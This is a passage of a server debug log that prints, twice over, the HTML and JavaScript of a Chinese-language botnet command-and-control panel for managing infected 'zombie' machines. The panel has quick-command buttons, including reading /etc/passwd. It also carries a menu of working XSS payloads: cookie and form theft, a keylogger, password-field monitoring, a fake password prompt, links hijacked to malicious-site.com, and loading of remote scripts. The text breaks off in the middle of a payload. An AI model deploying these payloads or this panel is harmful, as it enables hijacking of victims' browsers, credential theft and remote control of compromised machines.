殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-26 22:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:11] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:11] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:11] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:52:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:52:11 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:52:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" herf="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 